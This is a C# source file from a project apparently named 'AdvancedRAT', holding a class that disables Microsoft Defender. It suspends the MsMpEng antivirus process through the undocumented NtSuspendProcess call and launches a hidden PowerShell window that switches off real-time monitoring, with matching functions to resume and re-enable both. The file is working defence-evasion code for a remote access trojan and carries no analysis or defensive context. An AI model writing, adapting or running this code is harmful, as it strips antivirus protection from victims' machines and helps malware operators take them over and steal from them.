using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace AdvancedRAT.Core.Security
{
    public class DefenderSuspender
    {
        [DllImport("ntdll.dll")]
        private static extern uint NtSuspendProcess(IntPtr processHandle);

        [DllImport("ntdll.dll")]
        private static extern uint NtResumeProcess(IntPtr processHandle);

        public static bool SuspendMsMpEng()
        {
            try
            {
                Process[] defenderProcesses = Process.GetProcessesByName("MsMpEng");
                
                foreach (Process proc in defenderProcesses)
                {
                    if (!proc.HasExited)
                    {
                        uint result = NtSuspendProcess(proc.Handle);
                        if (result == 0) // STATUS_SUCCESS
                        {
                            Console.WriteLine($"Successfully suspended MsMpEng PID: {proc.Id}");
                            return true;
                        }
                        else
                        {
                            Console.WriteLine($"Failed to suspend MsMpEng PID: {proc.Id}, Error Code: {result}");
                        }
                    }
                }
                
                Console.WriteLine("No MsMpEng processes found to suspend");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error suspending Defender: {ex.Message}");
                return false;
            }
        }

        public static bool ResumeMsMpEng()
        {
            try
            {
                Process[] defenderProcesses = Process.GetProcessesByName("MsMpEng");
                
                foreach (Process proc in defenderProcesses)
                {
                    if (!proc.HasExited)
                    {
                        uint result = NtResumeProcess(proc.Handle);
                        if (result == 0) // STATUS_SUCCESS
                        {
                            Console.WriteLine($"Successfully resumed MsMpEng PID: {proc.Id}");
                            return true;
                        }
                        else
                        {
                            Console.WriteLine($"Failed to resume MsMpEng PID: {proc.Id}, Error Code: {result}");
                        }
                    }
                }
                
                Console.WriteLine("No MsMpEng processes found to resume");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error resuming Defender: {ex.Message}");
                return false;
            }
        }
        
        public static bool DisableDefenderServices()
        {
            try
            {
                // Attempt to stop Windows Defender service
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                
                using (Process proc = Process.Start(startInfo))
                {
                    proc?.WaitForExit(10000); // Wait up to 10 seconds
                }
                
                Console.WriteLine("Attempted to disable real-time monitoring");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error disabling Defender services: {ex.Message}");
                return false;
            }
        }
        
        public static bool EnableDefenderServices()
        {
            try
            {
                // Attempt to re-enable Windows Defender service
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $false\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                
                using (Process proc = Process.Start(startInfo))
                {
                    proc?.WaitForExit(10000); // Wait up to 10 seconds
                }
                
                Console.WriteLine("Attempted to enable real-time monitoring");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enabling Defender services: {ex.Message}");
                return false;
            }
        }
    }
}